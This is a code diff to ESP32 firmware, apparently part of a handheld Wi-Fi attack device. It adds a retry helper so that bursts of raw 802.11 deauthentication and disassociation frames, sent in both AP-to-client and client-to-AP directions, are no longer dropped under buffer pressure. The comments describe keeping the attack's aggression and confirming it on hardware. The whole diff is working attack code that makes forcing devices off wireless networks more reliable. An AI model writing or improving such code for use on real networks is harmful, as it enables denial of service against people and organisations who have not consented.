@@ -143,6 +143,21 @@ static inline void _deauth_build(uint8_t *frame,
     frame[25] = 0x00;
 }
 
+/* TX one raw frame, retrying on ESP_ERR_NO_MEM (257). Under burst load
+ * the dynamic TX buffer pool momentarily fills (the lean 4/4 WiFi buffer
+ * config used by wifi_lean_sta_init), so esp_wifi_80211_tx drops ~half
+ * the frames silently. A short wait + retry lets the pool drain instead.
+ * Confirmed on hardware via the on-screen "tx rc" readout — GitHub #7. */
+static inline esp_err_t _deauth_tx(uint8_t *frame)
+{
+    esp_err_t r = esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
+    for (int i = 0; r == ESP_ERR_NO_MEM && i < 4; ++i) {
+        vTaskDelay(pdMS_TO_TICKS(3));
+        r = esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
+    }
+    return r;
+}
+
 /*
  * Fire a deauth+disassoc burst at `dst` via `bssid`. With
  * `include_reverse=true` (default) sends 4 frames (AP→STA pair + STA→AP
@@ -197,18 +212,18 @@ static inline int wifi_deauth_pair(const uint8_t dst[6],
      * Triton was hitting. 2 ms is enough to let the prior frame drain
      * but doesn't measurably reduce deauth aggression (still 4 frames
      * within 8 ms vs 0 ms previous). */
-    r = esp_wifi_80211_tx(WIFI_IF_STA, ap_to_sta_deauth, 26, false); if (r == ESP_OK) ok++;
+    r = _deauth_tx(ap_to_sta_deauth); if (r == ESP_OK) ok++;
     vTaskDelay(pdMS_TO_TICKS(2));
-    r = esp_wifi_80211_tx(WIFI_IF_STA, ap_to_sta_dis, 26, false); if (r == ESP_OK) ok++;
+    r = _deauth_tx(ap_to_sta_dis); if (r == ESP_OK) ok++;
     /* POS-AUDIT-031: STA->AP reverse direction adds 4 ms airtime for
      * broadcast deauth where the client is already covered by AP->STA.
      * Targeted deauth keeps both directions (some implementations only
      * honour the matching-direction frame). */
     if (include_reverse) {
         vTaskDelay(pdMS_TO_TICKS(2));
-        r = esp_wifi_80211_tx(WIFI_IF_STA, sta_to_ap_deauth, 26, false); if (r == ESP_OK) ok++;
+        r = _deauth_tx(sta_to_ap_deauth); if (r == ESP_OK) ok++;
         vTaskDelay(pdMS_TO_TICKS(2));
-        r = esp_wifi_80211_tx(WIFI_IF_STA, sta_to_ap_dis, 26, false); if (r == ESP_OK) ok++;
+        r = _deauth_tx(sta_to_ap_dis); if (r == ESP_OK) ok++;
     }
 
     /* Expose the last rc so feature UIs can display it on-screen
